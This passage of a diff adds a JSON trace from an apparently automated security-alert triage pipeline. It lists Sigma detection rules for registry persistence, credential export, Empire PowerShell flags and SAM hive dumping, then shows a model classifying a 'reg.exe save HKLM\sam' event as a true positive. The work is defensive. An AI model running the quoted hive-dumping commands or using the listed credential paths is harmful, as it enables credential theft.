+      ],
+      "logsource": null,
+      "technique_ids": [
+       "T1059.001"
+      ],
+      "score": 0.028693528693528692,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     }
+    ],
+    "sigma_rules": [
+     {
+      "id": "8f3ab69a-aa22-4943-aa58-e0a52fdf6818",
+      "kind": "sigma_rule",
+      "title": "User Shell Folders Registry Modification via CommandLine",
+      "text": "User Shell Folders Registry Modification via CommandLine\nLogsource: process_creation/windows\nTags: attack.persistence, attack.privilege-escalation, attack.defense-impairment, attack.t1547.001, attack.t1112\nLevel: high\nDescription: Detects modifications to User Shell Folders registry values via reg.exe or PowerShell, which could indicate persistence attempts.\nAttackers may modify User Shell Folders registry values to point to malicious executables or scripts that will be executed during startup.\nThis technique is often used to maintain persistence on a compromised system by ensuring that malicious payloads are executed automatically.\nDetection:\nselection_img:\n- Image|endswith:\n  - \\powershell.exe\n  - \\pwsh.exe\n  - \\reg.exe\n- OriginalFileName:\n  - powershell.exe\n  - pwsh.dll\n  - reg.exe\nselection_cli_action:\n  CommandLine|contains:\n  - ' add '\n  - New-ItemProperty\n  - Set-ItemProperty\n  - 'si '\nselection_cli_paths_root:\n  CommandLine|contains:\n  - \\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n  - \\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nselection_cli_paths_suffix:\n  CommandLine|contains: Startup\ncondition: all of selection_*\nFalse positives: Usage of reg.exe or PowerShell to modify User Shell Folders for legitimate purposes; but rare.",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": "process_creation/windows",
+      "technique_ids": [
+       "T1547.001",
+       "T1112"
+      ],
+      "score": 0.03047794966520434,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "7c06ab9b-b1d2-4ba9-b06e-09491ded20d9",
+      "kind": "sigma_rule",
+      "title": "System Restore Registry Modification via CommandLine",
+      "text": "System Restore Registry Modification via CommandLine\nLogsource: process_creation/windows\nTags: attack.impact, attack.t1490\nLevel: high\nDescription: Detects system restore registry modification via command line, which can be used by adversaries to disable system restore on the computer.\nDetection:\nselection_img:\n- Image|endswith:\n  - \\powershell.exe\n  - \\pwsh.exe\n  - \\reg.exe\n- OriginalFileName:\n  - powershell.exe\n  - pwsh.dll\n  - reg.exe\nselection_cli_action:\n  CommandLine|contains:\n  - ' add '\n  - Set-ItemProperty\n  - New-ItemProperty\nselection_cli_reg_root:\n  CommandLine|contains:\n  - \\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\n  - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\nselection_cli_reg_key:\n  CommandLine|contains:\n  - DisableConfig\n  - DisableSR\ncondition: all of selection_*\nFalse positives: Unknown",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": "process_creation/windows",
+      "technique_ids": [
+       "T1490"
+      ],
+      "score": 0.030117753623188408,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "cc1abf27-78a3-4ac5-a51c-f3070b1d8e40",
+      "kind": "sigma_rule",
+      "title": "Registry Export of Third-Party Credentials",
+      "text": "Registry Export of Third-Party Credentials\nLogsource: process_creation/windows\nTags: attack.credential-access, attack.t1552.002\nLevel: high\nDescription: Detects the use of reg.exe to export registry paths associated with third-party credentials.\nCredential stealers have been known to use this technique to extract sensitive information from the registry.\nDetection:\nselection_img:\n- Image|endswith: \\reg.exe\n- OriginalFileName: reg.exe\nselection_cli_save:\n  CommandLine|contains:\n  - save\n  - export\nselection_cli_path:\n  CommandLine|contains:\n  - \\Software\\Aerofox\\Foxmail\\V3.1\n  - \\Software\\Aerofox\\FoxmailPreview\n  - \\Software\\DownloadManager\\Passwords\n  - \\Software\\FTPWare\\COREFTP\\Sites\n  - \\Software\\IncrediMail\\Identities\n  - \\Software\\Martin Prikryl\\WinSCP 2\\Sessions\n  - \\Software\\Mobatek\\MobaXterm\n  - \\Software\\OpenSSH\\Agent\\Keys\n  - \\Software\\OpenVPN-GUI\\configs\n  - \\Software\\ORL\\WinVNC3\\Password\n  - \\Software\\Qualcomm\\Eudora\\CommandLine\n  - \\Software\\RealVNC\\WinVNC4\n  - \\Software\\RimArts\\B2\\Settings\n  - \\Software\\SimonTatham\\PuTTY\\Sessions\n  - \\Software\\SimonTatham\\PuTTY\\SshHostKeys\n  - \\Software\\Sota\\FFFTP\n  - \\Software\\TightVNC\\Server\n  - \\Software\\WOW6432Node\\Radmin\\v3.0\\Server\\Parameters\\Radmin\ncondition: all of selection_*\nFalse positives: Unknown",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": "process_creation/windows",
+      "technique_ids": [
+       "T1552.002"
+      ],
+      "score": 0.028693528693528692,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+      "kind": "sigma_rule",
+      "title": "HackTool - Empire PowerShell Launch Parameters",
+      "text": "HackTool - Empire PowerShell Launch Parameters\nLogsource: process_creation/windows\nTags: attack.execution, attack.t1059.001\nLevel: high\nDescription: Detects suspicious powershell command line parameters used in Empire\nDetection:\nselection:\n  CommandLine|contains:\n  - ' -NoP -sta -NonI -W Hidden -Enc '\n  - ' -noP -sta -w 1 -enc '\n  - ' -NoP -NonI -W Hidden -enc '\n  - ' -noP -sta -w 1 -enc'\n  - ' -enc  SQB'\n  - ' -nop -exec bypass -EncodedCommand '\ncondition: selection\nFalse positives: Other tools that incidentally use the same command line parameters",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": "process_creation/windows",
+      "technique_ids": [
+       "T1059.001"
+      ],
+      "score": 0.028588564574170333,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     },
+     {
+      "id": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+      "kind": "sigma_rule",
+      "title": "Dumping of Sensitive Hives Via Reg.EXE",
+      "text": "Dumping of Sensitive Hives Via Reg.EXE\nLogsource: process_creation/windows\nTags: attack.credential-access, attack.t1003.002, attack.t1003.004, attack.t1003.005, car.2013-07-001\nLevel: high\nDescription: Detects the usage of \"reg.exe\" in order to dump sensitive registry hives. This includes SAM, SYSTEM and SECURITY hives.\nDetection:\nselection_img:\n- Image|endswith: \\reg.exe\n- OriginalFileName: reg.exe\nselection_cli_flag:\n  CommandLine|contains:\n  - ' save '\n  - ' export '\n  - ' ˢave '\n  - ' eˣport '\nselection_cli_hklm:\n  CommandLine|contains:\n  - hklm\n  - hk˪m\n  - hkey_local_machine\n  - hkey_˪ocal_machine\n  - hkey_loca˪_machine\n  - hkey_˪oca˪_machine\nselection_cli_hive:\n  CommandLine|contains:\n  - \\system\n  - \\sam\n  - \\security\n  - \\ˢystem\n  - \\syˢtem\n  - \\ˢyˢtem\n  - \\ˢam\n  - \\ˢecurity\ncondition: all of selection_*\nFalse positives: Dumping hives for legitimate purpouse i.e. backup or forensic investigation",
+      "platforms": [
+       "windows"
+      ],
+      "logsource": "process_creation/windows",
+      "technique_ids": [
+       "T1003.002",
+       "T1003.004",
+       "T1003.005"
+      ],
+      "score": 0.028125,
+      "matched_by": [
+       "vector",
+       "bm25"
+      ]
+     }
+    ]
+   }
+  },
+  {
+   "node": "triage",
+   "start": 0.166,
+   "end": 27.181,
+   "update": {
+    "verdict": {
+     "verdict": "true_positive",
+     "confidence": 0.95,
+     "technique_ids": [
+      "T1003.002",
+      "T1059.001"
+     ],
+     "reasoning": "reg.exe was spawned by powershell.exe and ran \"reg.exe save HKLM\\sam sam\", dumping the SAM registry hive to a file — a classic credential-access action matching T1003.002 (Security Account Manager). The parent PowerShell used -noP -sta -w 1 -enc with a base64-encoded command, matching T1059.001 as the execution mechanism. No legitimate role explains a workstation user saving the SAM hive.",
+     "evidence_refs": [
+      "events[0].process.command_line",
+      "events[0].process.image",
+      "events[0].process.parent.image",
+      "events[0].process.parent.command_line"
+     ],
+     "ioc_refs": [
+      "C:\\Windows\\System32\\reg.exe",
+      "HKLM\\sam",
+      "sam",
+      "THESHIRE\\pgustavo",
+      "WORKSTATION5.theshire.local"
+     ]
+    },
+    "triage_schema_retries": 0,
+    "triage_tier": 1,
+    "triage_escalation": null,
+    "triage_runs": [
+     {
+      "tier": 1,
+      "model": "openrouter:nvidia/nemotron-3.5-super-vl:free",
+      "ok": true,
+      "input_tokens": 7589,
+      "output_tokens": 933,
+      "cost_usd": 0.0,
+      "llm_calls": 1,
+      "lookups": [],
+      "rejected": [],
+      "schema_retries": 0,
+      "error": null
+     }
+    ],
+    "triage_cost_usd": 0.0
+   }
+  },
+  {
+   "node": "route",
+   "start": 27.181,
+   "end": 27.403,
+   "update": {
+    "covering_rule_id": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+    "coverage": {
+     "covering_rule_id": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+     "checked": [
+      "8f3ab69a-aa22-4943-aa58-e0a52fdf6818",
+      "7c06ab9b-b1d2-4ba9-b06e-09491ded20d9",
+      "cc1abf27-78a3-4ac5-a51c-f3070b1d8e40",
+      "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+      "fd877b94-9bb5-4191-bb25-d79cbd93c167"
+     ],
+     "missing": [],
+     "broken": [],
+     "unavailable": null
+    }
+   }
+  },
+  {
+   "node": "output",
+   "start": 27.403,
+   "end": 27.403,
+   "update": {
+    "outcome": "covered"
+   }
+  }
+ ]
+}
